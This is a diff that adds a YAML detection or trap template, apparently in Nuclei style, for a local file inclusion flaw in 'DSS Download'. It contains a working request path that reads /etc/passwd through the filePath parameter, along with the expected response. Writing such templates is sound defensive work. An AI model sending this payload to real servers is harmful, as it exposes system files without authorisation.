@@ -1,0 +1,23 @@
+id: dss-download-fileread
+info:
+  name: DSS Download - Local File Inclusion
+  author: ritikchaddha
+  description: DSS Download is vulnerable to local file inclusion.
+  severity: high
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cwe-id: CWE-22
+  metadata:
+    max-request: 1
+  tags: lfi,dss,lfr
+traps:
+- request:
+    method: GET
+    path: /portal/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: 'root:[x*]:0:0:'
